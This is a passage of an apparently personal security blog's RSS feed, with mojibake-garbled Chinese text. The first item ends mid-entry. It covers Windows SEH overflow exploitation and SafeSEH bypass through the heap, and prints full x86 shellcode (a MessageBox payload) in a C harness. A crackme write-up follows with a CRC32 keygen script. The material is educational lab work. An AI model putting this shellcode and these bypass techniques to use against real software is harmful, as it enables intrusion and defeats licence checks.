&amp;quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&amp;quot; &amp;quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&amp;quot; &amp;quot;\xfc\x68\x6a\x0a\x38\x1e\x68\x63\x89\xd1\x4f\x68\x32\x74\x91\x0c&amp;quot; &amp;quot;\x8b\xf4\x8d\x7e\xf4\x33\xdb\xb7\x04\x2b\xe3\x66\xbb\x33\x32\x53&amp;quot; &amp;quot;\x68\x75\x73\x65\x72\x54\x33\xd2\x64\x8b\x5a\x30\x8b\x4b\x0c\x8b&amp;quot; &amp;quot;\x49\x1c\x8b\x09\x8b\x69\x08\xad\x3d\x6a\x0a\x38\x1e\x75\x05\x95&amp;quot; &amp;quot;\xff\x57\xf8\x95\x60\x8b\x45\x3c\x8b\x4c\x05\x78\x03\xcd\x8b\x59&amp;quot; &amp;quot;\x20\x03\xdd\x33\xff\x47\x8b\x34\xbb\x03\xf5\x99\x0f\xbe\x06\x3a&amp;quot; &amp;quot;\xc4\x74\x08\xc1\xca\x07\x03\xd0\x46\xeb\xf1\x3b\x54\x24\x1c\x75&amp;quot; &amp;quot;\xe4\x8b\x59\x24\x03\xdd\x66\x8b\x3c\x7b\x8b\x59\x1c\x03\xdd\x03&amp;quot; &amp;quot;\x2c\xbb\x95\x5f\xab\x57\x61\x3d\x6a\x0a\x38\x1e\x75\xa9\x33\xdb&amp;quot; &amp;quot;\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6c\x8b\xc4\x53\x50\x50&amp;quot; &amp;quot;\x53\xff\x57\xfc\x53\xff\x57\xf8\x90\x90\x90\x90\x90\x90\x90\x90&amp;quot; &amp;quot;\x90\x90\x90\x90\x90\x90\x90\x90\x18\x30\x40\x00&amp;quot;  å‘:
 ä¹‹å‰ç”¨äº†DEBUGç‰ˆæœ¬, å‘ç°eipå¹¶ä¸èƒ½è·³åˆ°æŒ‡å®šä½ç½®, ç¨‹åºåœ¨å¼€å§‹å¤„ç†å¼‚å¸¸åä¼šå¡æ­», çŒœæµ‹æ˜¯è¿›è¡Œäº†æ£€æŸ¥ ç¨‹åºæ²¡æœ‰è§¦å‘å¼‚å¸¸, å‘ç°æ˜¯shellcodeæŠŠå˜é‡zeroçš„å€¼ç»™è¦†ç›–æˆäº†0x90909090, ç„¶åæŠŠshellcodeå¯¹åº”ä½ç½®æ”¹æˆ\x00åå‘ç°strcpyä¼šæˆªæ–­\x00åçš„å†…å®¹, æ‰€ä»¥åœ¨strcpyåé‡æ–°ç»™zeroé‡æ–°èµ‹0å€¼(ç¯å¢ƒä¸åŒ, ç¼–è¯‘å‡ºçš„ç»“æœä¸åŒ)   å¼€å¯safeSEH
ç»•è¿‡safeSEHçš„æ–¹æ³•è¿˜æ˜¯æŒºå¤šçš„
è¿™é‡Œåˆ©ç”¨å †ç»•è¿‡
#include &amp;lt;stdio.h&amp;gt; #include &amp;lt;Windows.h&amp;gt; char shellCode[] = &amp;quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&amp;quot; &amp;quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&amp;quot; &amp;quot;\xfc\x68\x6a\x0a\x38\x1e\x68\x63\x89\xd1\x4f\x68\x32\x74\x91\x0c&amp;quot; &amp;quot;\x8b\xf4\x8d\x7e\xf4\x33\xdb\xb7\x04\x2b\xe3\x66\xbb\x33\x32\x53&amp;quot; &amp;quot;\x68\x75\x73\x65\x72\x54\x33\xd2\x64\x8b\x5a\x30\x8b\x4b\x0c\x8b&amp;quot; &amp;quot;\x49\x1c\x8b\x09\x8b\x69\x08\xad\x3d\x6a\x0a\x38\x1e\x75\x05\x95&amp;quot; &amp;quot;\xff\x57\xf8\x95\x60\x8b\x45\x3c\x8b\x4c\x05\x78\x03\xcd\x8b\x59&amp;quot; &amp;quot;\x20\x03\xdd\x33\xff\x47\x8b\x34\xbb\x03\xf5\x99\x0f\xbe\x06\x3a&amp;quot; &amp;quot;\xc4\x74\x08\xc1\xca\x07\x03\xd0\x46\xeb\xf1\x3b\x54\x24\x1c\x75&amp;quot; &amp;quot;\xe4\x8b\x59\x24\x03\xdd\x66\x8b\x3c\x7b\x8b\x59\x1c\x03\xdd\x03&amp;quot; &amp;quot;\x2c\xbb\x95\x5f\xab\x57\x61\x3d\x6a\x0a\x38\x1e\x75\xa9\x33\xdb&amp;quot; &amp;quot;\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6c\x8b\xc4\x53\x50\x50&amp;quot; &amp;quot;\x53\xff\x57\xfc\x53\xff\x57\xf8\x90\x90\x90\x90\x90\x90\x90\x90&amp;quot; &amp;quot;\x90\x90\x90\x90\x90\x90\x90\x90\x18\x30\x40\x00&amp;quot;; char jumpCode[] = &amp;quot;aaaaaaaaaaaaa\xaa\xbb\xcc\xdd&amp;quot;; DWORD myExceptionHandler() { printf(&amp;quot;Got an exception!</description>
    </item>
    
    <item>
      <title>è®°æŸæ¬¡é€†å‘cm.pdf</title>
      <link>https://aiQG.github.io/%E8%AE%B0%E6%9F%90%E6%AC%A1%E9%80%86%E5%90%91cm.pdf/</link>
      <pubDate>Wed, 17 Apr 2019 00:00:00 +0000</pubDate>
      
      <guid>https://aiQG.github.io/%E8%AE%B0%E6%9F%90%E6%AC%A1%E9%80%86%E5%90%91cm.pdf/</guid>
      <description>è®°æŸæ¬¡é€†å‘cm.pdf</description>
    </item>
    
    <item>
      <title>crackme_CRC32</title>
      <link>https://aiQG.github.io/crackme_crc32/</link>
      <pubDate>Mon, 25 Mar 2019 00:00:00 +0000</pubDate>
      
      <guid>https://aiQG.github.io/crackme_crc32/</guid>
      <description>//å‰å‡ å¤©æ‰åœ¨0CTFåšäº†ä¸ªCRC128ä¸åŠ¨ç‚¹çš„é¢˜(å¤ªèœæ²¡åšå‡ºæ¥)ã€‚ä»Šå¤©æ­£å¥½å­¦ä¹ ä¸€ä¸‹ //æ–‡æœ«å†³å®šç©ä¸€ç©CRCå¾ªç¯ç çš„ç‰¹æ€§
éšä¾¿è¾“å…¥ä¸€ç‚¹ä¸œè¥¿ å‘ç°åªæœ‰è¾“å…¥çš„Nameé•¿åº¦å¤§äº5æ‰æœ‰é”™è¯¯æç¤ºæ¡†, æœ‰æç¤ºæ¡†å°±å¥½åŠäº† idaæ‰¾åˆ°å‡ ä¸ªMessageBox äº¤å‰å¼•ç”¨çœ‹çœ‹åœ¨å“ªè¢«ä½¿ç”¨äº†, æ‰¾åˆ°æœ‰æ˜æ˜¾åˆ¤æ–­+è·³è½¬çš„å‡½æ•° åœ¨å‡½æ•°å¼€å§‹çš„åœ°æ–¹ä¸‹æ–­ç‚¹, è°ƒè¯• 1.ç¨‹åºå…ˆè·å–Nameçš„é•¿åº¦ åˆ¤æ–­ä¸å°äº5ç»§ç»­ 2.Nameå‰é¢åŠ ä¸Šç› 3.è®¡ç®—åŠ ç›åNameçš„CRC32 4.è·å–Codeé•¿åº¦ åˆ¤æ–­ä¸å°äº0ç»§ç»­ 5.å°†Codeè¿›è¡Œç›¸å…³è®¡ç®—å¾—åˆ°ä¸€ä¸ªæ•°å­—X 6.Xä¸CRC32ç‚¹å€¼æ¯”å¯¹ ç›¸åŒåˆ™ok //CRC32ä½œä¸ºâ€œä¼˜ç§€çš„â€hashå¾ªç¯ç  é€†æ˜¯ä¸ä¼šé€†å‡ºæ¥çš„ ä½†æ˜¯å¯ä»¥ç¢°æ’ ç®—Codeçš„å…³é”®ç®—æ³•: CRC32çš„ç®—æ³•ä¸èƒ½é€†è¿ç®—, ä½†æ˜¯å¯ä»¥çœ‹å‡ºCodeçš„ç®—æ³•æ˜¯å°†è¾“å…¥çš„Codeå˜æˆä¸€ä¸ªåè¿›åˆ¶æ•°
import binascii name=&#39;&#39; name = raw_input(&#39;input your user name:\t&#39;)#py2 name = &#39;DiKeN&#39;+name crc32code = binascii.crc32(name) #ä¸ºäº†ä¿è¯CRCæ˜¯æ­£çš„ if crc32code&amp;lt;0: crc32code = ~binascii.crc32(name)^0xffffffff elif crc32code&amp;gt;0: crc32code = binascii.crc32(name) code=&#39;&#39; while crc32code!=0: code = str(crc32code % 10) + code crc32code = crc32code // 10 print &#39;your code:\t&#39;+code   crcå¾ªç¯æ ¡éªŒç çš„ç‰¹æ€§å¯¼è‡´åŒä¸€ä¸ªCodeå¯èƒ½å¯¹åº”å¤šä¸ªName ç”±äºç¨‹åºæ­£å‘ä¸éœ€è¦åˆ¤æ–­Codeæ˜¯å¦ä¸º0ï½9(åˆæ³•å­—ç¬¦) æ‰€ä»¥ä¸ºäº†æ–¹ä¾¿è¿™é‡Œé™åˆ¶Codeåªèƒ½ä¸º0ï½9çš„æ•°å­—//è¿™é‡Œæœ‰ä¸ªéé¢„æœŸ ç”±äºæ²¡æœ‰åˆ¤æ–­Codeæ˜¯å¦ä¸º0ï½9(åˆæ³•å­—ç¬¦)æ‰€ä»¥å¯ä»¥æ„é€ å‡ºå¤šä¸ªå¥‡æ€ªè€Œæ­£ç¡®çš„Code 32ä½çš„crcåªèƒ½æ„é€ å‡º0x10000000åˆ°0xffffffffçš„hash</description>
    </item>
    
  </channel>
</rss>
